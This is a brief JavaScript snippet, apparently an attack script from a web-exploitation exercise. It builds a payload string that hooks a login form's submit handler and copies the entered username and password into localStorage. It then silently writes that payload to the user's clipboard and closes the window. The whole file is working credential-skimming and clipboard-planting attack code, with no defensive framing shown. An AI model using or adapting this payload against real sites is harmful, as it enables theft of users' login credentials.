var payload = `

document.querySelector('form#login-form').addEventListener('submit',(e)=>{
    localStorage.u= document.querySelector('#LoginForm_username').value
    localStorage.p= document.querySelector('#LoginForm_password').value
})

`


window.focus()
navigator.clipboard.writeText(payload);

setTimeout(()=>window.close(), 1000)